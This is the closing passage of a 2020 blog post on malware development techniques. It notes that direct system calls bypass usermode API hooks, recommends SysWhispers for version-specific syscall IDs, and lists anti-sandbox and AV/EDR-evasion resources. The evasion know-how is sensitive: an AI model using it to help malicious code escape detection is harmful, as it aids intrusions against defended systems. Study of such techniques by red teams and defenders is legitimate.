<span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
</code></pre></div></div>

<p>That way we have bypassed any hooks on usermode WinAPI thread creation functions. However we have hardcoded the syscall ID (<code class="language-plaintext highlighter-rouge">0xBD</code>)
 which is version-specific. To support different Windows versions we 
would need to have all syscalls IDs and dynamically check system 
version. That’s where <a href="https://github.com/jthuraisamy/SysWhispers/"><code class="language-plaintext highlighter-rouge">SysWhispers</code></a>
 tool comes in handy. We can use this great tool to generate necessary 
functions and types definitions in C and OS version checks and syscall 
definitions in assembly.</p>

<h2 id="summary">Summary</h2>
<p>We went through popular methods for detecting sandboxes, virtual machines and automated analysis used by malware.</p>

<p>In the next article we will take a look at multiple debugger 
detection methods and talk about how to make debugging of our compiled 
code harder.</p>

<h3 id="links">Links</h3>

<p>Be sure to check these great resources on the topic:</p>

<p><a href="https://github.com/Arvanaghi/CheckPlease">https://github.com/Arvanaghi/CheckPlease</a></p>

<p><a href="https://github.com/LordNoteworthy/al-khaser">https://github.com/LordNoteworthy/al-khaser</a></p>

<p><a href="https://github.com/a0rtega/pafish">https://github.com/a0rtega/pafish</a></p>

<p><a href="https://github.com/CheckPointSW/InviZzzible">https://github.com/CheckPointSW/InviZzzible</a></p>

<p><a href="https://evasions.checkpoint.com/">https://evasions.checkpoint.com/</a></p>

<p><a href="https://github.com/hfiref0x/VBoxHardenedLoader">https://github.com/hfiref0x/VBoxHardenedLoader</a></p>

<p><a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/</a></p>

<p><a href="https://github.com/jthuraisamy/SysWhispers">https://github.com/jthuraisamy/SysWhispers</a></p>

<p><a href="https://github.com/j00ru/windows-syscalls">https://github.com/j00ru/windows-syscalls</a></p>

<p><a href="https://ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs">https://ired.team/offensive-security/defense-evasion/using-syscalls-directly-from-visual-studio-to-bypass-avs-edrs</a></p>

  </div>

  <div class="date">
    Written on April  5, 2020
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          



<a href="https://github.com/0xPat"><i class="svg-icon github"></i></a>

<a href="https://www.linkedin.com/in/patryk-czeczko"><i class="svg-icon linkedin"></i></a>


<a href="https://www.twitter.com/0xPat"><i class="svg-icon twitter"></i></a>



        </footer>
      </div>
    </div>

    

  

</body></html>